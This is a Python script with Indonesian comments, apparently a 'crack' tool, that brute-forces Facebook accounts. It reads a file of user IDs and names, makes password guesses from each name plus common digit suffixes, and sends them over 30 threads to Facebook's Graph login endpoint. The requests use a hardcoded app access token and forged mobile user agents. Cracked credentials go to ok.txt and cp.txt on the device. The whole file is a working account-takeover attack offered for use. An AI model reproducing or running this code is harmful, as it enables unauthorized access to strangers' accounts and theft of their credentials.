#coding utf-8
#code kall dev 
#silahkan rekod jgn di premin yah mek
#next update gw tambah menu lainya
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'    # WARNA MATI

ugen = []
for i in range(10000):
     rr = random.randint
     a = str(rr(5,13))
     versi_android = f"{str(rr(3,9))}"+"."+f"{str(rr(0,2))}"+"."+f"{str(rr(0,2))}"
     denin = random.choice(["{density=2.25,height=1092,width=2082};]","{density=2.0,height=850,width=750};]","{density=3.0,height=1082,width=1092};]","{density=2.25,height=2093,width=1093};]"])
     merk = random.choice(["V2020","V3020","V2023","V2024","V2025","V2026","V2027","V2021","V2022","V2028","V2029","V2030","V2031","V2032","V2033","V2034","V2035","V2036","V2037","V2038","V2039","V2040","V2041","V2042"])
     merk1 = random.choice(["vivo 1600","vivo 1601","vivo 1602","vivo 1603","vivo 1604","vivo 1605","vivo 1606","vivo 1607","vivo 1608","vivo 1609","vivo 1700","vivo 1701","vivo 1702","vivo 1704","vivo 1703","vivo 1705","vivo 1706","vivo 1707","vivo 1708","vivo 1709","vivo 1800","vivo 1801","vivo 1802","vivo 1803","vivo 1804","vivo 1805","vivo 1806","vivo 1807","vivo 1808","vivo 1809","vivo 1900","vivo 1901","vivo 1902","vivo 1903","vivo 1904","vivo 1905","vivo 1906","vivo 1907","vivo 1908","vivo 1909","vivo 1611","vivo 1612","vivo 1711","vivo 1712","vivo 1811","vivo 1812","vivo 1920","vivo 1620","vivo 1792","vivo 1983","vivo 1769"])
     a = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     d = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     ua = f'Dalvik/2.1.0 (Linux; U; Android ; {merk} Build/{b}{a}{str(rr(1,9))}{c}.{str(rr(100000,300000))}.014) [FBAN/MessengerLite;FBAV/{str(rr(60,400))}.0.0.7.74;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(10000000,90000000))};FBCR/smartfren;FBMF/vivo;FBBD/vivo;FBDV/{merk};FBSV/{a};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+denin
     uz = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {merk1} Build/{c}{b}{a}{str(rr(1,50))}{d}) [FBAN/MessengerLite;FBAV/{str(rr(100,300))}.0.0.2.49;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(10000000,90000000))};FBCR/XL Axiata;FBMF/vivo;FBBD/vivo;FBDV/{merk1};FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+denin
     uah = random.choice([ua, uz])
     ugen.append(uah)
     
class crackfile:
      
      def __init__(self):
            self.loop,self.ugen,self.ok,self.cp,self.id1,self.id2 = 0,[],[],[],[],[]
            self.ses = requests.Session()
            self.file()
            
      def ClearCoy(self):
            if "linux" in sys.platform.lower():
                  try:os.system('clear')
                  except:pass
                  
      def api(self,username,passz):
            xxx = str(random.choice([M, K, H]))
            sys.stdout.write(f"\r{xxx}[ b-Api Developers ] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}{N}");sys.stdout.flush()
            for password in passz:
                  try:
                        ua=random.choice(ugen)
                        head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                        date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'id_ID', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                        xnxx = self.ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                        if "session_key" in xnxx:
                              print(f'\r{H}* --> {username}|{password}')
                              open('/sdcard/ok.txt','a').write(f'{username}|{password}\n')
                              self.ok.append(username)
                              break
                        elif "www.facebook.com" in xnxx["error"]["message"]:
                              print(f'\r{K}* --> {username}|{password}')
                              open('/sdcard/cp.txt','a').write(f'{username}|{password}\n')
                              self.ok.append(username)
                              break
                        elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:sys.stdout.write(f"\r{M}[ b-Api Developers Spam] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}");sys.stdout.flush()
                        else:continue	
                  except requests.exceptions.ConnectionError: time.sleep(35)
            self.loop+=1
            
      def listpw(self):
            self.intel()
            with ThreadPoolExecutor(max_workers=30) as kalldev:
                  for idf in self.id2:
                        uid,user = idf.split('|')[0], idf.split('|')[1].lower()
                        xxx = user.split(' ')[0]
                        if len(user) <=5:
                               if len(xxx) <=1 or len(xxx) <=2:pass 
                               else:
                                     pwd=[
                                         xxx+'321',
                                         xxx+'123', 
                                         xxx+'1234', 
                                         xxx+'12345', 
                                         xxx+'123456',
                                         xxx+'01',xxx+'02',
                                         xxx+'03',xxx+'04',
                                         xxx+'05',xxx+'06',
                                         xxx+'07',xxx+'08',
                                         xxx+'09',xxx+'10'
                                    ]
                        else:
                              pwd=[
                                  user, 
                                  xxx+'321',
                                  xxx+'123', 
                                  xxx+'1234', 
                                  xxx+'12345', 
                                  xxx+'123456',
                                  xxx+'01',xxx+'02',
                                  xxx+'03',xxx+'04',
                                  xxx+'05',xxx+'06',
                                  xxx+'07',xxx+'08',
                                  xxx+'09',xxx+'10'
                             ]
                        kalldev.submit(self.api,uid,pwd)
            exit('Crack Sukses Jgn Lupa Like Gh Gw ')
            
      def file(self):
            self.ClearCoy()
            print(f"""         CRACK SIMPLE BY XYTA ID""")
            print(f'{N}--------------------------------------------')
            file = input(f'{P}[{H}?{P}] Your File : {N}')
            try:
                 for line in open(file, 'r').readlines():
                       self.id1.append(line.strip())
            except IOError:
                  exit(f'{N}[{M}×{N}] File Tidak Ada')
            for ih in self.id1:
                  self.id2.insert(0, ih)
            self.listpw()
            
      def intel(self):
            print(f'{N}---------------------------------------------\nCrack Starting On Off Modpes Agar Tidak Spam')   
            print(f'{N}--------------------------------------------')
            
crackfile()